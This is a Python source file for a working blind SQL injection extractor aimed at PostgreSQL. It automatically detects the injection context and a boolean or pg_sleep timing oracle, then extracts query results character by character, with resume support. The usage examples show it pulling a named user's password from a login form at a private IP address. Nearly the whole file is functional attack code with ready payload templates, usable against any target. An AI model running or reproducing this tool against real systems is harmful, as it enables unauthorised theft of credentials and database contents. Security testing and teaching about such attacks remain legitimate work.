#!/usr/bin/env python3
"""
pg_time_blind.py - Structured PostgreSQL blind SQLi extractor.

Works against ANY PostgreSQL target with a blind injection, regardless of:
  - HTTP method (GET / POST / anything)
  - where the injection lives (URL, body, or a header)
  - parameter name

It now runs in TWO PHASES:

  PHASE 1 - DETECTION
    Auto-discovers (a) the injection CONTEXT (stacked / string-AND / string-OR /
    numeric-AND / numeric-OR) and (b) the blind TYPE:
      * BOOLEAN-based  - preferred, because it needs no waiting (fast).
                         TRUE vs FALSE is told apart by AUTO-CALIBRATION:
                         the tool sends a known-true and a known-false payload
                         and diffs status code -> body length -> body text to
                         pick a reliable discriminator.
      * TIME-based     - fallback, using pg_sleep() when boolean gives no signal.

  PHASE 2 - EXTRACTION
    Uses whichever oracle was detected. Per character it does a binary search on
    the ASCII value (~7 requests/char) instead of trying all 95 printable chars.

It does NOT depend on sqlmap.

RESUME / MEMORY
  Progress is checkpointed to a small JSON state file in the current directory
  after every character. If interrupted (Ctrl+C, dead box, network blip), run
  the SAME command again to auto-resume. Use --fresh to ignore a checkpoint, or
  --state PATH to choose the file. The checkpoint is deleted on success.

----------------------------------------------------------------------
HOW IT WORKS
  You mark the injection point with a placeholder (default: INJECT).
  Detection figures out the context+type automatically; you can pin them with
  --context / --force-boolean / --force-time, or supply a custom --template.

----------------------------------------------------------------------
EXAMPLES

1) Login form, fully automatic (detect context + type, then extract):
   python3 pg_time_blind.py \
     -u http://192.168.245.89:3000/login \
     -d "username=INJECT&password=test" \
     --query "SELECT password FROM users WHERE username='antwon'"

2) Re-use a saved raw HTTP request file (put INJECT where the payload goes):
   python3 pg_time_blind.py --request req.txt --query "SELECT current_user"

3) Force time-based, numeric context (skip detection of those):
   python3 pg_time_blind.py -u "http://target/item?id=INJECT" \
     --force-time --context numeric-and --query "SELECT version()"

4) Help the boolean calibrator when responses are noisy:
   python3 pg_time_blind.py -u http://t/login -d "username=INJECT&password=x" \
     --true-match "Dashboard" --query "SELECT current_user"
----------------------------------------------------------------------
"""
import sys, os, time, json, hashlib, argparse, re, urllib.parse
import requests

requests.packages.urllib3.disable_warnings()


# ---------------------------------------------------------------------------
# Injection contexts. Each has a BOOLEAN template (changes the page when the
# condition is true/false) and/or a TIME template (delays when true).
#   {cond}  = a SQL boolean condition
#   {sleep} = seconds to sleep (time templates only)
# ---------------------------------------------------------------------------
class Context:
    def __init__(self, name, bool_tpl, time_tpl):
        self.name = name
        self.bool_tpl = bool_tpl
        self.time_tpl = time_tpl


CONTEXTS = [
    Context("stacked",     None,
            "';SELECT pg_sleep({sleep}) WHERE {cond}--"),
    Context("string-and",  "' AND ({cond})--",
            "' AND (CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({sleep})) ELSE 1 END)=1--"),
    Context("string-or",   "' OR ({cond})--",
            "' OR (CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({sleep})) ELSE 1 END)=1--"),
    Context("numeric-and", " AND ({cond})--",
            " AND (CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({sleep})) ELSE 1 END)=1--"),
    Context("numeric-or",  " OR ({cond})--",
            " OR (CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({sleep})) ELSE 1 END)=1--"),
]
CONTEXTS_BY_NAME = {c.name: c for c in CONTEXTS}

TRUE_COND, FALSE_COND = "1=1", "1=2"


def parse_request_file(path, proto):
    """Parse a raw HTTP request file into (method, url, headers, body)."""
    raw = open(path, "r", encoding="utf-8", errors="ignore").read().replace("\r\n", "\n")
    head, _, body = raw.partition("\n\n")
    lines = head.split("\n")
    method, target, _ = (lines[0].split() + ["", "", ""])[:3]
    headers = {}
    for ln in lines[1:]:
        if ":" in ln:
            k, v = ln.split(":", 1)
            headers[k.strip()] = v.strip()
    host = headers.get("Host", "")
    url = target if target.startswith("http") else f"{proto}://{host}{target}"
    return method, url, headers, body.rstrip("\n")


class Resp:
    __slots__ = ("status", "text", "length", "elapsed")
    def __init__(self, status, text, elapsed):
        self.status = status
        self.text = text
        self.length = len(text)
        self.elapsed = elapsed


class Target:
    """Owns the HTTP plumbing: substitute the marker, send, time the response."""
    def __init__(self, a):
        self.a = a
        self.count = 0
        if a.request:
            self.method, self.url, self.headers, self.data = parse_request_file(a.request, a.proto)
        else:
            self.url, self.data, self.headers = a.url, a.data, {}
            for h in (a.header or []):
                k, v = h.split(":", 1)
                self.headers[k.strip()] = v.strip()
            self.method = (a.method or ("POST" if a.data else "GET")).upper()
        self.proxies = {"http": a.proxy, "https": a.proxy} if a.proxy else None

    def _enc(self, p):
        return urllib.parse.quote_plus(p) if self.a.encode else p

    def _put(self, s, payload):
        return s.replace(self.a.marker, payload) if s else s

    def send(self, payload):
        payload = self._enc(payload)
        url = self._put(self.url, payload)
        data = self._put(self.data, payload)
        headers = {k: self._put(v, payload) for k, v in self.headers.items()}
        headers.pop("Content-Length", None)
        if data and not any(k.lower() == "content-type" for k in headers):
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        self.count += 1
        t = time.time()
        try:
            r = requests.request(self.method, url, data=data, headers=headers,
                                 proxies=self.proxies, verify=False,
                                 timeout=self.a.sleep + 20, allow_redirects=False)
        except requests.exceptions.RequestException as e:
            raise SystemExit(f"\n[!] request error: {e}\n"
                             "    (progress is checkpointed - re-run the same command to resume)")
        return Resp(r.status_code, r.text or "", time.time() - t)


# ---------------------------------------------------------------------------
# Oracles - each answers a single question: "is this SQL condition TRUE?"
# ---------------------------------------------------------------------------
class Oracle:
    def __init__(self, target, ctx, a):
        self.t = target
        self.ctx = ctx
        self.a = a
        self.kind = "?"
        self.desc = ""

    def fires(self, cond):                 # -> bool ; overridden
        raise NotImplementedError

    def length(self, query):
        for n in range(1, self.a.maxlen + 1):
            if self.fires(f"length(({query}))={n}"):
                return n
        return None

    def char(self, query, pos):
        lo, hi = self.a.cmin, self.a.cmax
        while lo < hi:
            mid = (lo + hi) // 2
            if self.fires(f"ascii(substr(({query}),{pos},1))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return chr(lo)


class TimeOracle(Oracle):
    def __init__(self, target, ctx, a):
        super().__init__(target, ctx, a)
        self.kind = "time-based"
        self.tpl = a.template or ctx.time_tpl
        self.thresh = a.threshold if a.threshold else a.sleep * 0.6
        self.desc = f"context={ctx.name} sleep={a.sleep}s threshold={self.thresh:.2f}s"

    def fires(self, cond):
        payload = self.tpl.format(cond=cond, sleep=self.a.sleep)
        for attempt in range(self.a.retries + 1):
            slow = self.t.send(payload).elapsed >= self.thresh
            if slow and attempt < self.a.retries:
                continue                    # re-confirm a positive to beat jitter
            return slow
        return True


class BoolOracle(Oracle):
    def __init__(self, target, ctx, a, classifier, desc):
        super().__init__(target, ctx, a)
        self.kind = "boolean-based"
        self.tpl = a.template or ctx.bool_tpl
        self.classify = classifier          # Resp -> bool (True == condition true)
        self.desc = f"context={ctx.name} signal={desc}"

    def fires(self, cond):
        payload = self.tpl.format(cond=cond)
        return self.classify(self.t.send(payload))


# ---------------------------------------------------------------------------
# Detection
# ---------------------------------------------------------------------------
def _stable(vals, jitter):
    return max(vals) - min(vals) <= jitter


def calibrate_boolean(target, ctx, a):
    """Send known-true/false twice each, auto-pick a discriminator.
    Returns (classifier, description) or None."""
    # explicit override wins
    if a.true_match:
        tok = a.true_match
        return (lambda r: tok in r.text), f"text~'{tok}'"
    if a.false_match:
        tok = a.false_match
        return (lambda r: tok not in r.text), f"!text~'{tok}'"

    T = [target.send(ctx.bool_tpl.format(cond=TRUE_COND)) for _ in range(2)]
    F = [target.send(ctx.bool_tpl.format(cond=FALSE_COND)) for _ in range(2)]

    # 1) status code
    st_t, st_f = {r.status for r in T}, {r.status for r in F}
    if len(st_t) == 1 and len(st_f) == 1 and st_t != st_f:
        good = st_t.pop()
        return (lambda r, s=good: r.status == s), f"status=={good}"

    # 2) body length (stable within each group, far enough apart)
    lt, lf = [r.length for r in T], [r.length for r in F]
    if _stable(lt, a.len_jitter) and _stable(lf, a.len_jitter):
        ct, cf = sum(lt) / len(lt), sum(lf) / len(lf)
        if abs(ct - cf) >= a.len_margin:
            mid = (ct + cf) / 2
            hi_is_true = ct > cf
            return ((lambda r, m=mid, h=hi_is_true: (r.length > m) == h),
                    f"len~{int(ct)}vs{int(cf)}")

    # 3) a token present in BOTH true responses and NEITHER false response
    tl_t = [set(r.text.split()) for r in T]
    tl_f = [set(r.text.split()) for r in F]
    only_true = (tl_t[0] & tl_t[1]) - (tl_f[0] | tl_f[1])
    for tok in sorted(only_true, key=len, reverse=True):
        if len(tok) >= 3:
            return (lambda r, k=tok: k in r.text), f"text~'{tok}'"
    only_false = (tl_f[0] & tl_f[1]) - (tl_t[0] | tl_t[1])
    for tok in sorted(only_false, key=len, reverse=True):
        if len(tok) >= 3:
            return (lambda r, k=tok: k not in r.text), f"!text~'{tok}'"

    return None


def time_works(target, ctx, a):
    """True if a true condition delays and a false one doesn't (genuinely timed)."""
    tpl = ctx.time_tpl
    thresh = a.threshold if a.threshold else a.sleep * 0.6
    if target.send(tpl.format(cond=FALSE_COND, sleep=a.sleep)).elapsed >= thresh:
        return False                         # always slow -> not conditional
    return target.send(tpl.format(cond=TRUE_COND, sleep=a.sleep)).elapsed >= thresh


def detect(target, a):
    """Return a ready Oracle, preferring boolean over time. None if nothing fires."""
    if a.context:
        contexts = [CONTEXTS_BY_NAME[a.context]]
    else:
        contexts = CONTEXTS

    # custom template short-circuits context discovery
    if a.template:
        ctx = contexts[0]
        if not a.force_time:
            cal = None
            if "{sleep}" not in a.template:   # template looks boolean
                cal = calibrate_boolean_custom(target, a)
            if cal:
                return BoolOracle(target, ctx, a, cal[0], cal[1])
        return TimeOracle(target, ctx, a)

    # 1) BOOLEAN first (fast, no waiting)
    if not a.force_time:
        for ctx in contexts:
            if not ctx.bool_tpl:
                continue
            print(f"[*] probing boolean   : {ctx.name} ...", flush=True)
            cal = calibrate_boolean(target, ctx, a)
            if cal:
                print(f"[+] boolean signal on {ctx.name}: {cal[1]}")
                return BoolOracle(target, ctx, a, cal[0], cal[1])

    # 2) TIME fallback
    if not a.force_boolean:
        for ctx in contexts:
            if not ctx.time_tpl:
                continue
            print(f"[*] probing time      : {ctx.name} ...", flush=True)
            if time_works(target, ctx, a):
                print(f"[+] time-based fires on {ctx.name}")
                return TimeOracle(target, ctx, a)

    return None


def calibrate_boolean_custom(target, a):
    """Calibrate when the user supplied a boolean --template."""
    if a.true_match:
        tok = a.true_match
        return (lambda r: tok in r.text), f"text~'{tok}'"
    T = [target.send(a.template.format(cond=TRUE_COND)) for _ in range(2)]
    F = [target.send(a.template.format(cond=FALSE_COND)) for _ in range(2)]
    st_t, st_f = {r.status for r in T}, {r.status for r in F}
    if len(st_t) == 1 and len(st_f) == 1 and st_t != st_f:
        good = st_t.pop()
        return (lambda r, s=good: r.status == s), f"status=={good}"
    lt, lf = [r.length for r in T], [r.length for r in F]
    if _stable(lt, a.len_jitter) and _stable(lf, a.len_jitter) and abs(sum(lt)/2 - sum(lf)/2) >= a.len_margin:
        ct, cf = sum(lt)/2, sum(lf)/2
        return ((lambda r, m=(ct+cf)/2, h=(ct > cf): (r.length > m) == h), f"len~{int(ct)}vs{int(cf)}")
    return None


# ---------------------------- resume / checkpoint ----------------------------
def job_signature(a, oracle):
    raw = "|".join([oracle.t.method, oracle.t.url or "", oracle.t.data or "",
                    oracle.kind, oracle.ctx.name, a.query,
                    str(a.sleep), str(a.cmin), str(a.cmax)])
    return hashlib.sha1(raw.encode()).hexdigest()[:10]

def load_state(path, sig):
    try:
        d = json.load(open(path))
        if d.get("sig") == sig:
            return d
    except Exception:
        pass
    return None

def save_state(path, sig, length, value, count):
    tmp = path + ".tmp"
    with open(tmp, "w") as f:
        json.dump({"sig": sig, "length": length, "value": value, "count": count}, f)
    os.replace(tmp, path)


def main():
    ap = argparse.ArgumentParser(description="Structured PostgreSQL blind SQLi extractor (boolean + time)")
    src = ap.add_argument_group("target (use -u/-d/-H  OR  --request)")
    src.add_argument("-u", "--url", help="URL (may contain the marker for GET injection)")
    src.add_argument("-d", "--data", help="request body (may contain the marker)")
    src.add_argument("-H", "--header", action="append", help="extra header 'Name: value' (repeatable; may contain marker)")
    src.add_argument("-X", "--method", help="HTTP method (default: POST if -d given else GET)")
    src.add_argument("--request", help="raw HTTP request file with the marker inside")
    src.add_argument("--proto", default="http", help="proto for --request file (default http)")

    inj = ap.add_argument_group("injection")
    inj.add_argument("--query", required=True, help="SQL scalar to extract, e.g. \"SELECT password FROM users WHERE username='bob'\"")
    inj.add_argument("--marker", default="INJECT", help="placeholder for the injection point (default INJECT)")
    inj.add_argument("--template", help="custom payload template using {cond} (+ {sleep} for time)")
    inj.add_argument("--no-encode", dest="encode", action="store_false", help="do NOT url-encode the payload")

    det = ap.add_argument_group("detection")
    det.add_argument("--context", choices=list(CONTEXTS_BY_NAME), help="pin the injection context (skip context discovery)")
    det.add_argument("--force-boolean", action="store_true", help="only use boolean-based blind")
    det.add_argument("--force-time", action="store_true", help="only use time-based blind")
    det.add_argument("--true-match", help="string present ONLY in a TRUE response (overrides auto-calibration)")
    det.add_argument("--false-match", help="string present ONLY in a FALSE response (overrides auto-calibration)")
    det.add_argument("--len-margin", type=int, default=12, help="min body-length gap to treat as a boolean signal (default 12)")
    det.add_argument("--len-jitter", type=int, default=4, help="allowed body-length wobble within one response type (default 4)")

    tun = ap.add_argument_group("tuning")
    tun.add_argument("--sleep", type=float, default=3.0, help="pg_sleep seconds for time-based (default 3)")
    tun.add_argument("--threshold", type=float, default=0.0, help="seconds to count as 'slept' (default sleep*0.6)")
    tun.add_argument("--retries", type=int, default=1, help="re-confirm a time positive N times (default 1)")
    tun.add_argument("--maxlen", type=int, default=64, help="max length to probe (default 64)")
    tun.add_argument("--cmin", type=int, default=32, help="min ASCII for binary search (default 32)")
    tun.add_argument("--cmax", type=int, default=126, help="max ASCII for binary search (default 126)")
    tun.add_argument("--proxy", help="e.g. http://127.0.0.1:8080")

    res = ap.add_argument_group("resume / memory")
    res.add_argument("--state", help="checkpoint file path (default: auto-named .pgtb-<id>.json)")
    res.add_argument("--fresh", action="store_true", help="ignore any existing checkpoint and start over")

    ap.set_defaults(encode=True)
    a = ap.parse_args()

    if not a.request and not a.url:
        ap.error("provide -u/--url (with -d/-H) or --request")
    if a.force_boolean and a.force_time:
        ap.error("--force-boolean and --force-time are mutually exclusive")

    target = Target(a)

    print("=== PHASE 1: detection ===")
    oracle = detect(target, a)
    if not oracle:
        print("\n[!] no blind injection detected.")
        print("    try: a different --context, --force-time, --true-match, or check the marker placement.")
        sys.exit(1)
    print(f"\n[+] TYPE   : {oracle.kind}")
    print(f"[+] DETAIL : {oracle.desc}")
    print(f"[*] detection cost: {target.count} requests\n")

    print("=== PHASE 2: extraction ===")
    sig = job_signature(a, oracle)
    state_path = a.state or f".pgtb-{sig}.json"
    print(f"[*] query  : {a.query}")
    print(f"[*] state  : {state_path}")

    value, length = "", None
    if not a.fresh:
        st = load_state(state_path, sig)
        if st:
            length, value = st.get("length"), st.get("value", "")
            print(f"[*] resuming from checkpoint: {len(value)}/{length} chars  ->  '{value}'")

    if length is None:
        length = oracle.length(a.query)
        if length is None:
            print("[!] length not found (empty result, bad query, or maxlen too low)")
            sys.exit(1)
        save_state(state_path, sig, length, value, target.count)
    print(f"[+] length = {length}\n[*] extracting: {value}", end="", flush=True)

    try:
        for pos in range(len(value) + 1, length + 1):
            value += oracle.char(a.query, pos)
            save_state(state_path, sig, length, value, target.count)
            sys.stdout.write(value[-1]); sys.stdout.flush()
    except KeyboardInterrupt:
        save_state(state_path, sig, length, value, target.count)
        print(f"\n\n[!] interrupted - progress saved to {state_path}")
        print("    re-run the SAME command to resume from here.")
        sys.exit(130)

    print(f"\n\n[+] RESULT: {value}")
    print(f"[*] total requests: {target.count}  (type: {oracle.kind})")
    try:
        os.remove(state_path)
    except OSError:
        pass


if __name__ == "__main__":
    main()
